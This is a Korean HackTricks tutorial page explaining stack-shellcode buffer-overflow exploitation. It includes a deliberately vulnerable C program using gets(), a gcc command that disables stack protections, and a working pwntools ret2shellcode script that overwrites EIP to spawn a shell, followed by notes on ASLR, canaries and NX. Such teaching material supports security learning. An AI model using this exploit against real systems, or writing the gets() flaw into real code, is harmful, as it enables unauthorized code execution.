# 스택 쉘코드

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

**스택 쉘코드**는 **바이너리 익스플로잇**에서 사용되는 기술로, 공격자가 취약한 프로그램의 스택에 쉘코드를 작성하고 **명령어 포인터 (IP)** 또는 **확장된 명령어 포인터 (EIP)**를 이 쉘코드의 위치를 가리키도록 수정하여 실행시키는 것입니다. 이는 무단 액세스를 얻거나 대상 시스템에서 임의의 명령을 실행하는 데 사용되는 고전적인 방법입니다. 여기에는 간단한 C 예제와 **pwntools**를 사용하여 해당 취약점을 이용하는 방법을 설명하고 있습니다.

### C 예제: 취약한 프로그램

간단한 취약한 C 프로그램 예제부터 시작해보겠습니다:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
이 프로그램은 `gets()` 함수 사용으로 버퍼 오버플로우에 취약합니다.

### 컴파일

취약한 환경을 시뮬레이션하기 위해 다양한 보호 기능을 비활성화하면서 이 프로그램을 컴파일하려면 다음 명령을 사용할 수 있습니다:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: 스택 보호 기능을 비활성화합니다.
* `-z execstack`: 스택을 실행 가능하게 만들어줍니다. 이는 스택에 저장된 셸코드를 실행하는 데 필요합니다.
* `-no-pie`: 위치 독립 실행 파일을 비활성화하여 셸코드가 위치할 메모리 주소를 예측하기 쉽게 합니다.
* `-m32`: 프로그램을 32비트 실행 파일로 컴파일합니다. 종종 exploit 개발의 간편함을 위해 사용됩니다.

### Pwntools를 사용한 Python Exploit

다음은 **pwntools**를 사용하여 **ret2shellcode** 공격을 수행하는 Python exploit을 작성하는 방법입니다:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
이 스크립트는 **NOP 슬라이드**, **쉘코드**, 그리고 **EIP**를 NOP 슬라이드를 가리키는 주소로 덮어쓰면서 쉘코드가 실행되도록 페이로드를 구성합니다.

**NOP 슬라이드** (`asm('nop')`)는 실행이 정확한 주소에 관계없이 쉘코드로 "슬라이딩"될 가능성을 높이기 위해 사용됩니다. `p32()` 인자를 버퍼의 시작 주소에 오프셋을 더한 값으로 조정하여 NOP 슬라이드에 도달하도록 합니다.

## 보호 기능

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)은 실행마다 신뢰할 수 있는 주소를 위해 **비활성화**되어야 합니다. 그렇지 않으면 함수가 저장될 주소가 항상 동일하지 않을 수 있고, 이를 알아내기 위해 유출이 필요할 수 있습니다.
* [**스택 카나리**](../common-binary-protections-and-bypasses/stack-canaries/)도 비활성화되어야 합니다. 그렇지 않으면 침해된 EIP 반환 주소가 결코 따라가지 않을 수 있습니다.
* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **스택** 보호는 스택 내부의 쉘코드 실행을 방지할 수 있습니다. 해당 영역은 실행할 수 없기 때문입니다.

## 다른 예제 및 참고 자료

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64비트, 스택 주소 유출과 ASLR, 쉘코드 작성 및 실행
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32비트, 스택 유출과 ASLR, 쉘코드 작성 및 실행
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32비트, 스택 유출과 ASLR, exit() 호출 방지를 위한 비교, 변수 덮어쓰기 및 쉘코드 작성 및 실행
